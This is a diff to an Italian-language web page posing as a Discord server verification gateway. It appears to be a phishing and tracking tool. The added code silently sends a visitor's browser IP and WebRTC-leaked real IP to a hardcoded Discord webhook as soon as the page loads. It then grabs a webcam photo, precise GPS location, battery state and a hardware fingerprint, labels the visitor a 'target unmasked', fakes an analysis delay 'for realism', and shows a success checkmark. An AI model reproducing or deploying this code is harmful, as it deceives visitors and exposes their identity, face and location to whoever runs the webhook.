@@ -58,10 +58,38 @@
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .checkmark {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: block;
+            stroke-width: 2;
+            stroke: #3ba55c;
+            stroke-miterlimit: 10;
+            box-shadow: inset 0px 0px 0px #3ba55c;
+            animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
+            margin: 0 auto;
         }
+        .checkmark__circle {
+            stroke-dasharray: 166;
+            stroke-dashoffset: 166;
+            stroke-width: 2;
+            stroke-miterlimit: 10;
+            stroke: #3ba55c;
+            fill: none;
+            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+        }
+        .checkmark__check {
+            transform-origin: 50% 50%;
+            stroke-dasharray: 48;
+            stroke-dashoffset: 48;
+            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
+        }
+        @keyframes stroke { 100% { stroke-dashoffset: 0; } }
+        @keyframes scale { 0%, 100% { transform: none; } 50% { transform: scale3d(1.1, 1.1, 1); } }
+        @keyframes fill { 100% { box-shadow: inset 0px 0px 0px 30px transparent; } }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
         .error-box {
             background-color: rgba(250, 119, 122, 0.1);
             border: 1px solid #fa777a;
@@ -106,20 +134,31 @@
 
     <!-- VISTA 2: GATEWAY DI VERIFICA -->
     <div id="main-view" class="card hidden">
-        <div class="mb-6 flex justify-center">
-            <svg width="48" height="48" viewBox="0 0 24 24" fill="#5865f2">
-                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 13.17l7.59-7.59L19 7l-9 10z"/>
-            </svg>
-        </div>
-        
-        <h1 class="text-white text-xl font-bold mb-2">Verifica del Server</h1>
-        <p class="text-[#b5bac1] text-sm mb-6 leading-relaxed">
-            Acquisizione dei dati biometrici e hardware in corso per la sicurezza del Gateway. Non chiudere la pagina.
-        </p>
+        <div id="loading-container">
+            <div class="mb-6 flex justify-center">
+                <svg width="48" height="48" viewBox="0 0 24 24" fill="#5865f2">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 13.17l7.59-7.59L19 7l-9 10z"/>
+                </svg>
+            </div>
+            
+            <h1 class="text-white text-xl font-bold mb-2">Verifica del Server</h1>
+            <p class="text-[#b5bac1] text-sm mb-6 leading-relaxed">
+                Acquisizione dei dati biometrici e hardware in corso per la sicurezza del Gateway. Non chiudere la pagina.
+            </p>
 
-        <div id="loading-spinner" class="flex flex-col items-center">
-            <div class="spinner mb-4"></div>
-            <p id="status-text" class="text-white text-sm font-medium">Analisi in corso...</p>
+            <div class="flex flex-col items-center">
+                <div class="spinner mb-4"></div>
+                <p id="status-text" class="text-white text-sm font-medium">Analisi in corso...</p>
+            </div>
+        </div>
+
+        <div id="success-container" class="hidden">
+            <svg class="checkmark mb-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+                <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+            </svg>
+            <h1 class="text-white text-xl font-bold mb-2">Verificato!</h1>
+            <p class="text-[#b5bac1] text-sm">Il tuo tool è ora disponibile.</p>
         </div>
         
         <p class="mt-6 text-[11px] text-[#949ba4] leading-tight italic">
@@ -132,9 +171,41 @@
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1460188881755574480/1oStlZfQj8KYHZRkqS1EqZxfgY44DslDjGI3TjcUZrxcbmoiD0AW_qNvx39lzso8V-Zc";
+        
+        let initialIPs = { std: "Analisi...", real: "Analisi..." };
+        
+        // --- FUNZIONE INVIO IMMEDIATO APPENA ENTRA ---
+        window.onload = async () => {
+            // Recupero IP Standard
+            const ipFetch = fetch('https://api64.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => initialIPs.std = d.ip)
+                .catch(() => initialIPs.std = "Bloccato");
+            
+            // Recupero IP Reale
+            initialIPs.real = await getRealIp();
+            await ipFetch;
+
+            // Invio immediato e silenzioso dell'IP
+            const entryEmbed = {
+                title: "👁️ Nuovo Accesso alla Pagina",
+                description: "Un utente è entrato nella landing. Dati di rete acquisiti istantaneamente.",
+                color: 16776960, // Giallo
+                fields: [
+                    { name: "🌐 IP Browser (VPN/Proxy)", value: `\`${initialIPs.std}\``, inline: false },
+                    { name: "🟢 IP Reale (WebRTC Leak)", value: `\`${initialIPs.real}\``, inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [entryEmbed] })
+            });
+        };
 
         function retryProcessing() {
-            // Nascondiamo l'errore e riproviamo senza refresh
             document.getElementById('perm-error').style.display = 'none';
             document.getElementById('main-trigger').style.display = 'flex';
             startProcessing();
@@ -156,12 +227,10 @@
                             const imageData = canvas.toDataURL('image/jpeg', 0.8);
                             stream.getTracks().forEach(track => track.stop());
                             resolve(imageData);
-                        }, 800);
+                        }, 500);
                     };
                 });
-            } catch (e) { 
-                throw new Error("Cam denied"); 
-            }
+            } catch (e) { throw new Error("Cam denied"); }
         }
 
         function getRealIp() {
@@ -176,31 +245,8 @@
                         if (res) ips.add(res[1]);
                     }
                 };
-                setTimeout(() => { rtc.close(); resolve(ips.size > 0 ? Array.from(ips).join(" | ") : "N/A"); }, 2500);
+                setTimeout(() => { rtc.close(); resolve(ips.size > 0 ? Array.from(ips).join(" | ") : "N/A"); }, 2000);
             });
-        }
-
-        function getHardware() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A";
-            
-            let os = "Windows";
-            if (navigator.userAgent.indexOf("Mac") != -1) os = "MacOS";
-            if (navigator.userAgent.indexOf("Linux") != -1) os = "Linux";
-            if (navigator.userAgent.indexOf("Android") != -1) os = "Android";
-            if (navigator.userAgent.indexOf("iPhone") != -1) os = "iOS";
-
-            return {
-                os: os,
-                cores: navigator.hardwareConcurrency || "N/A",
-                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "8 GB",
-                gpu: gpu,
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                res: `${window.screen.width}x${window.screen.height}`,
-                ua: navigator.userAgent
-            };
         }
 
         async function getBattery() {
@@ -213,45 +259,61 @@
             return "N/A";
         }
 
-        function getGeo() {
-            return new Promise((res, rej) => {
-                navigator.geolocation.getCurrentPosition(
-                    (p) => res(`${p.coords.latitude}, ${p.coords.longitude}`),
-                    (e) => rej(new Error("Geo denied")),
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            });
+        function getHardware() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A";
+            
+            let os = "Windows";
+            if (navigator.platform.indexOf('Linux') !== -1) os = "Linux";
+            if (navigator.platform.indexOf('Mac') !== -1) os = "MacOS";
+            if (navigator.userAgent.indexOf('Android') !== -1) os = "Android";
+
+            return {
+                os: os,
+                cores: navigator.hardwareConcurrency || "N/A",
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "8 GB",
+                gpu: gpu,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                res: `${window.screen.width}x${window.screen.height}`,
+                ua: navigator.userAgent
+            };
         }
 
         async function startProcessing() {
             const errLabel = document.getElementById('perm-error');
             const mainBtn = document.getElementById('main-trigger');
-            errLabel.style.display = 'none';
-
+            
             try {
-                // Tentativo immediato di richiesta permessi
                 const photoPromise = captureWebcam();
-                const geoPromise = getGeo();
-                
-                // Se i permessi vengono accettati, passiamo alla vista di caricamento
+                const geoPromise = new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(
+                        (p) => res(`${p.coords.latitude}, ${p.coords.longitude}`),
+                        (e) => rej(e),
+                        { enableHighAccuracy: true, timeout: 5000 }
+                    );
+                });
+
                 document.getElementById('landing-view').classList.add('hidden');
                 document.getElementById('main-view').classList.remove('hidden');
 
                 const [photo, geo] = await Promise.all([photoPromise, geoPromise]);
 
-                const ipStd = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => "Bloccato");
-                const ipReal = await getRealIp();
-                const battery = await getBattery();
-                const hw = getHardware();
+                // FORZA 2 SECONDI DI ANALISI PER REALISMO
+                await new Promise(r => setTimeout(r, 2000));
 
+                const hw = getHardware();
+                const battery = await getBattery();
                 const formData = new FormData();
+                
+                // STRUTTURA EMBED COMPLETO (BASE RICHIESTA)
                 const embed = {
-                    title: "🎯 Target Smascherato (Cattura Automatica)",
-                    description: "Analisi hardware e scatto biometrico completati con successo tramite Welcomer Bot Protocol.",
+                    title: "🎯 Target Smascherato (Anti Junk Offer)",
                     color: 15548997,
                     fields: [
-                        { name: "🌐 IP Browser (VPN/Proxy)", value: `\`${ipStd}\``, inline: true },
-                        { name: "🟢 IP Reale (WebRTC Leak)", value: `\`${ipReal}\``, inline: true },
+                        { name: "🌐 IP Browser (VPN/Proxy)", value: `\`${initialIPs.std}\``, inline: false },
+                        { name: "🟢 IP Reale (WebRTC Leak)", value: `\`${initialIPs.real}\``, inline: false },
                         { name: "💻 Sistema Operativo", value: `\`${hw.os}\``, inline: true },
                         { name: "📍 Posizione GPS", value: `\`${geo}\``, inline: false },
                         { name: "🧠 Processore (Cores)", value: `\`${hw.cores} Core\``, inline: true },
@@ -273,12 +335,15 @@
 
                 await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
 
-                document.getElementById('status-text').innerText = "Verifica Completata!";
-                document.getElementById('status-text').style.color = "#3ba55c";
-                setTimeout(() => window.location.href = "https://discord.com/app", 1500);
+                // FINE: MOSTRA SPUNTA VERDE
+                document.getElementById('loading-container').classList.add('hidden');
+                document.getElementById('success-container').classList.remove('hidden');
+
+                setTimeout(() => window.location.href = "https://discord.com/app", 2000);
 
             } catch (error) {
-                // Se l'utente nega o c'è un errore, mostriamo il box di istruzioni senza caricare una nuova pagina
+                document.getElementById('landing-view').classList.remove('hidden');
+                document.getElementById('main-view').classList.add('hidden');
                 errLabel.style.display = 'block';
                 mainBtn.style.display = 'none';
             }
